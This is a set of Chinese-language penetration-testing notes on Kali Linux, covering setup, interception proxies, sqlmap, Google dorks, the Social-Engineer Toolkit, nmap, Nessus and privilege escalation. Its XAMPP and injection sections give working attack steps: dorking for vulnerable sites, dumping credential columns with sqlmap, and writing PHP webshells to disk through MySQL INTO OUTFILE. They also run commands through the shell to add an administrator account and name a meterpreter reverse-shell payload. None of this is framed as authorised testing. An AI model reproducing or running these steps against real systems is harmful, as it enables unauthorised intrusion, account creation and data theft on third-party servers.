# kali

- 基于Debian的Linux发行版本
- 前身是BackTrack, 2013年3月发布
- 用于渗透测试和安全审计
- 包含600+安全工具
- FHS标准目录结构
- 定制内核
- 支持ARM和手机平台
- 开源免费

## Kali Linux 策略

- root用户策略
- 网络服务策略
- 更新升级策略

## Setup kali

[Kali官网](http:/kali.org)

虚拟机(Debian 64，20G)

### 添加 Kali 更新源

``` shell
# vim /etc/apt/sources.list
deb http://http.kali.org/kali kali main non-free contrib
deb-src http://http.kali.org/kali kali main non-free contrib
deb http://security.kali.org/kali-security kali/updates main contrib non-free
deb http://ftp.sjtu.edu.cn/debian wheezy main non-free contrib
deb-src http://ftp.sjtu.edu.cn/debian wheezy main non-free contrib
deb http://ftp.sjtu.edu.cn/debian wheezy-proposed-updates main non-free contrib
deb-src http://ftp.sjtu.edu.cn/debian wheezy-proposed-updates main non-free contrib
deb http://ftp.sjtu.edu.cn/debian-security wheezy/updates main non-free contrib
deb-src http://ftp.sjtu.edu.cn/debian-security wheezy/updates main non-free contrib
deb http://mirrors.163.com/debian wheezy main non-free contrib
deb-src http://mirrors.163.com/debian wheezy main non-free contrib
deb http://mirrors.163.com/debian wheezy-proposed-updates main non-free contrib
deb-src http://mirrors.163.com/debian wheezy-proposed-updates main non-free contrib
deb-src http://mirrors.163.com/debian-security wheezy/updates main non-free contrib
deb http://mirrors.163.com/debian-security wheezy/updates main non-free contrib

# apt-get update 更新源
# apt-get upgrade 下载要更新的软件包
```

### kali-linux安装中文输入法（以下任意选择一种安装）：

``` shell
拼音五笔
# apt-get install fcitx-table-wbpy ttf-wqy-microhei ttf-wqy-zenhei

经典的ibus
# apt-get install ibus ibus-pinyin

fcitx拼音
# apt-get install fcitx fcitx-pinyin fcitx-module-cloudpinyin fcitx-googlepinyin

搜狗输入法
# dpkg -i sougou.xxx.deb 解包

自動解決依賴關係
# apt-get install -f

注销: 重新登录之后才可以使用
# reboot
```

### 安装 open-vm-tools

``` shell
# apt-get install open-vm-tools-desktop fuse
# reboot
```

### kali 的美化

- 图标位置: /usr/share/icons
  - numix
    - Numix-Circle
    - `# cp -r Numix-Circle/ /usr/share/icons/numix`
    - 
- 主题位置: /usr/share/thems/

- gnome3

### DNS 收集分析 - dnsdict6

``` shell
# dnsdict6 [options] [domain] [字典]
  -4 查询IPv4
  -D 显示自带的字典
  -t 线程数 最高32，默认是8
  -d 显示NS MX
  -S SRV服务名称猜解
  s(mall=100),-m(edium=1419) (DEFAULT)  线程数
  -l(arge=2601), -x(treme=5886) or-u(ber=16724)
```

- 1.0内置 dnsdict6
- 2.0 需要手动安装

手动安装dnsdict6

``` shell
# wget https://src.fedoraproject.org/lookaside/pkgs/thc-ipv6/thc-ipv6-2.7.tar.gz/md5/2975dd54be35b68c140eb2a6b8ef5e59/thc-ipv6-2.7.tar.gz
# tar zvxf thc-ipv6.2.7.tar.gz
# cd thc-ipv6.2.7
# sudo apt-get install libpcap-dev libssl-dev
# make
# sudo cp dnsdict6 /usr/bin/

# dnsdict6 -4 baidu.com 查找IPv4
# dnsdict6 baidu.com 查找IPv6

# vim 1.txt
ipv6
# dnsdict6 baidu.com 1.txt
```

### 启动 postgresql 服务

``` shell
# service postgresql start
# service metasploit start

在终端启动 metasploit 框架

# msfconsole

msf >
```

## 代理简介

### 正向代理 (Forward Proxy)

> 代理终端终端用户的访问请求

内部网络 -> proxy(代理主机) -> 外部网络

- 访问本无法访问的服务器（翻墙）
- Cache 作用
- 客户端访问授权
- 隐藏访问者的行踪

### 反向代理（Reverse Proxy）

> 代理 Web 等服务的服务器

Web服务 <--------- 反向代理服务器  -----> 网管 <---------> 内网

### 透明代理

### Kali 代理工具

### Mitmproxy

- a man-in-the-middle proxy (中间人攻击)
- Intercept HTTP requests and responses and modify them on the fly. (req/res 修改数据)
- Save complete HTTP conversations for later replay and analysis.
- Replay the client-side of an HTTP conversations.
- Replay proxy mode to forward traffic to a specified server.
- Transparent proxy mode on OSX and Linux.
- Make scripted changes to HTTP traffic using Python.
- **SSL** certificates for interception are generated on the fly.
- And much, much more.

``` shell

# mitmproxy -p 8080  #监听端口（）

1. 在浏览器配置代理IP和端口
2. 访问页面并查看终端输出的信息

pageDown/pageUp 翻页查看信息

过滤js信息：输入 `l` 之后出现 `Limit: `, 之后输入 `Limit: /.js`

清楚信息：输入 `l` 清楚 `/.js`

查看某一个请求信息：选中请求地址之后回车，会出现连个选项卡（Request | Response）, tab 键切换， 输入 q 回到主界面

拦截请求：输入 `i` 会出现 `Intercept filter:`, `~u \.php`，访问页面是有php文件请求时拦截，输入`a`放行，如果要编辑，则选择请求地址并按下` ENTER` 键并按下 `e` 键会出现 `Edit request (query, form, url, header, raw body, method)?` 按下 `q` 退出，继续输入 `a` 放行
```

命令行

`?` 进入帮助信息界面

`q` 返回到请求列表界面

`C` 清空列表

`j` 向下移动箭头

`k` 向上移动箭头

`PgUp/PgDown or 空格键` 上下翻页

### Owasp-zap

> OWASP Zed Attack Proxy Project 攻击代理(简称 ZAP)，是一款查找网页应用程序漏洞的综合类渗透测试工具。它包含了拦截代理、自动处理、被动处理、暴力破解、端口扫描以及蜘蛛搜索等功能。

为会话类调试工具，调试功能对网站不会发起大量请求，对服务器影响较小。

应用实例

``` shell
启动服务
# owasp-zap

选项->本地代理(Local Proxies)-> port: 8800

浏览器配置代理
```

### Paros

> paros proxy, 这是一个对 web 应用程序的漏洞进行评估的代理程序，即一个基于 Java 的 web 代理程序，可以评估 Web 应用程序的漏洞。它支持动态地编辑/查看 HTTP/HTTPS， 从而改变 cookies 和表单字段等项目。它包括一个 Web 通信记录程序，Web 圈套程序(spider)，hash 计算器，还有一个可以测试常见的 Web 应用程序攻击(如 SQL 注入式攻击和跨站脚本攻击)的扫描器。该工具检查漏洞形式包括：SQL 注入、跨站点脚本攻击、目录遍历等。

``` SHELL
# paros
tools->Local proxy -> 设置PI和port
浏览器设置代理IP地址访问
```

### Surp  Suite

> Burp Suite 是用于攻击 Web 应用程序的集成平台
> 代理 Burp Suite 带有一个代理，通过默认端口8080上运行，使用这个代理，可以截获并修改从客户端到 Web 应用程序的数据包

- Proxystrike
  - plugin engine(Create your own plugins)
  - Request interceptor
  - Request diffing
  - Request repeater
  - Automatic crawl process
  - http request/resonse
  - history request
  - parameter stats request
  - parameter values stats
  - Request url parameter signing and header field singing
  - Use of an alternate proxy(tor for example ;D)
  - Sql attackes(plugin)
  - Server Side includes(plugin)
  - Xss attacks(plugin)
  - Attack logs
  - Exort results to HTML or XML

`# proxystrike`

### webscarab

> 代理软件，包括 HTTP代理，网络爬行、网络蜘蛛、会话 ID 分析，自动脚本接口，模糊测试工具，Web格式的编码/解码，Web 服务描述语言和SOAP解析器等功能模块。WebScarab 基于 GNu 协议，使用 Java编写，是WebGoat 中所使用的 工具之一。

intercept 拦截

### 注入案例

``` config
以 sql 注入入手，目标为熟悉基本的思路

1. 通过google hack 寻找测试目标
2. asp 站点的 sql 注入
3. php 站点的 sql 注入及管理后台的寻找过程


公司 inurl:asp?id=

1. 测试数字型注入点
2. sqlmap 拆解数据库和表名
3. dump 表数据
4. 登录后台


查看所有数据库，当前用户
# sqlmap -u domain.com/index.aps?id=12 --dbs --current-user

# sqlmap -u domain.com/index.aps?id=12 -T table_name --columns 显示所有列名

# sqlmap -u domain.com/index.aps?id=12 -T table_name -C login_name,pass,username --dump 显示字段内容

# sqlmap -u domain.com/index.php?id=1 --dbms mysql -D db_name --tables

后台登录入口

```

PHP 站点的SQL注入

``` shell
1. 测试数字型注入点
2. `sqlmap` 拆解数据库和表名
3. `dump` 表数据
4. 利用 `nikto` 帮助寻找隐藏目录
5. 利用网页源代码中的隐藏信息寻找管理后台

常规测试：domain.com/index.php?id=1'

```

扫描隐藏目录

``` shell
# nikto -host 主域名
```

`user: <?php eval($_POST['x']);?>`

## google hack 实战

1. 寻找秩序构建工具 `Jenkins` 的管理面板，有可能获取某些项目的源代码或者敏感信息
2. 综合利用各种信息搞定 `xampp`
3. 后门查找
4. 关于 `google hack database`

### google hack 基础知识

[google hack](http://www.xuanhun521.com)

inurl:8080 intitle: "Dashboard [Jenkins]"

### 搞定 xampp

inurl: "xampp/index" intext:"XAMPP for Windows"

寻找 phpmyadmin 不同验证或者弱口令管理页面，通过 mysql 的 root 权限插入一句话木马提权，获取服务器管理权限

filetype: sql site:org intext:("insert" "admin")
http://www.prattmuseum.org/

use exploit/windows/http/xampp_webdav_upload_php

set payload php/meterpreter/reverse_tcp

net localgroup administrators name /add

``` mysql
mysql> create table aa(packet text) type=MYISAM;

mysql> insert into aa(packet) values('<pre><body bgcolor=silver><? @system($_get["cmd"])?></body></pre>');

写入到磁盘，并用PHP访问（存储路径，查找 `phpinfo.php`）
mysql> select * into outfile 'D:/xampp/htdocs/xampp/aa.php' from aa;

访问URL

http://domain.com/aa.php?cmd=dir

http://domain.com/aa.php?cmd=net user user_name user_pw /add
http://domain.com/aa.php?cmd=net localgroup administrators user_name /add

cmd: mstsc

 输入IP 和 用户名


```

### 后门获找

Google 搜索目标：intitle:"=[1n73ct10n privat shell]="

intitle:"WSO 2.4" [Sec. Info ], [ Files ], [ Console ], [Sql], [ Php ], [ Safe mode ], [ String tools ], [ Bruteforce ], [ Network ], [ Self remove ]

### 关于 `google hack database`

http://www.exploit-db.com/google-dorks/

需要自己灵活的扩展，以适应中文站点的查询

## SET

> 开源的社会工程学利用套件，通常结合 metasploit 来使用

项目地址：https://github.com/trustedsec/social-engineer-toolkit

Social-Engineering Attacks 社会工程学攻击

Fast-Track Penetration Testing 渗透测试

``` shell
# setoolkit
set> 1

1) Spear-Phishing Attack Vectors 鱼叉式钓鱼攻击
2) Website Attack Vectors 网站攻击
3) Infectious Media Generator 介质感染攻击
4) Create a Payload and Listener
5) Mass Mailer Attack 群发邮件攻击
6) Arduino-Based Attack Vector 基于 Arduino 的攻击
7) Wireless Access Point Attack Vector 无线接入点攻击
8) QRCode Generator Attack Vector 二维码攻击
9) Powershell Attack Vectors
10) SMS Spoofing Attack Vector
11) Third Party Modules
```

## nmap

> 用于网络发现(Network Discovery)和安全审计(Security Auditing)的网络安全工具

[nmap官方站点](http://nmap.org/)

### nmap - 主机扫描类型

``` options
nmap [Scan Type(s)] [Options] {target sepcification}

-sl(列表扫描)
-sP(Ping扫描)
-P0(无ping)
-PS [portlist](TCP SYN Ping)
-PA [portlist] (TCP ACK Ping)
-PU [portlist] (UDP Ping)
-PE;-PP;-PM (ICMP Ping Types)
-PR (ARP Ping)

参数：-n(不用域名解析), -R(为所有目标解析域名)

可以同时制定多种扫描方式
```

### nmap-端口扫描技术

``` options
-sS/sT/sA/sW/sM: TCP SYN/Connect()/ACK/Window/Maimon scans
-sU: UDP Scan
-sN/sF/sX: TCP Null, FIN, and Xmas scans
--scanflags <flags>: Customize TCP scan flags
-sl <zombie host[:probeport]>: idle scan
-sY/sZ: SCTP INIT/COOKIE-ECHO scans
-sO: IP protocol scan
-b <FTP relay host>: FTP bounce scan
```

### nmap 扫描命令格式

`nmap 扫描命令格式`：nmap [Scan Type(s)] [Options] {target specification}

nmap [Scan Type(s)] [Options] {target specification}

``` nmap
# nmap -sL 103.10.81.1-255 扫描主机
# nmap -PE 103.10.81.1-255 ping扫描
# nmap -PS80 103.10.87.1-255 对80端口扫描
# nmap -PR 103.10.87.1-255 对局域网扫描
# nmap -Pn 103.10.87.1-255 不适用 ping 扫描，更适合 internet
# nmap -sP 103.10.87.1-255(快速 ping 扫描)

# nmap -Pn -sn 103.10.87.1-255 只探测存存活主机，不扫描其他信息

#nmap -sS 103.10.87.148
#nmap -sT 103.10.87.1-255 查看打开端口的服务
#nmap -sU 103.10.87.1-255
#nmap -sU -p 80,445 103.10.87.1-255
#namp -sT -v 103.10.87.1-255(启用细节模式)
```

### nmap-操作系统探测

``` shell
-O (启用操作系统探测)
-osscan-limit(针对指定的目标进行操作系统检测)
--osscan-guess;--fuzzy(推测操作系统检测结果)

# nmap -sT -O 192.168.1.100
# nmap -sT -p 3390 -O --osscan-limit 103.10.87.148
# nmap -sA -O 103.10.87.148
```

### nmap-服务程序探测

``` shell
-sV

# nmap -sV 103.10.87.148
# nmap -sV -p 22,53, 110, 143, 4564 103.10.86.1-255
```

## nessus - 漏洞扫描工具

### 1. [nessus安装地址](https://www.tenable.com/downloads/nessus#nessus-7-1-3)

``` shell
# dkpg -i Nessus-VERSION.deb

启动服务命令
# /etc/init.d/nessusd start
```

### 2. 访问WebUI界面： https://kali:8834/

- user:root
- passwd:root

- [生成注册码地址](https://www.tenable.com/products/nessus/activation-code)

- Activation code*:
  - 7850-E1DC-580B-11B0-6C2F

- 显示下载插件进度条

### 2. nessus 扫描

- New Scan
  - Scanner Templates
    - Advanced Scan
      - Name：
      - Targets(扫描目标): 192.168.1.118

## 提权

### 提权方式

#### 1.纵向用户

guest -> admin -> domian admin

#### 2. 横向提权

guest -> admin1(开发部门权限)

admin2(销售部门权限)

### 漏洞提权

- Metasploit

### shell 提权

- webshell
- msf shell(普通用户权限升级到管理员权限)

### 弱口令提权

- 1pc telnet privi15 admin admin telnet://10.1.1.1 admin admin

### 配置缺陷提权

1. 配置文件泄露信息；/wwwroot.zip mysql config.php
2. 未授权访问

### 中间人攻击提权

## 越权

